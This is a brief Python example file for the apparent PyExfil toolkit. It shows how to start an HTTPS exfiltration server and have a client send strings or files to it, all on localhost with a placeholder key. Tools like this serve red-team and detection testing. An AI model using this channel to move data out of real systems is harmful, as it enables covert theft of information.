"""
Client Example - String Mode
"""

from https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host="127.0.0.1", key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()


"""
Server Example - String Mode
"""

from https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(
    host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192
)
server.startlistening()


"""
Server Example - File Mode
"""
from pyexfil.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(
    host="127.0.0.1",
    key="123",
    port=443,
    max_connections=5,
    max_size=8192,
    file_mode=True,
)
server.startlistening()


"""
Client Example - File Mode
"""
from pyexfil.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host="127.0.0.1", key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()
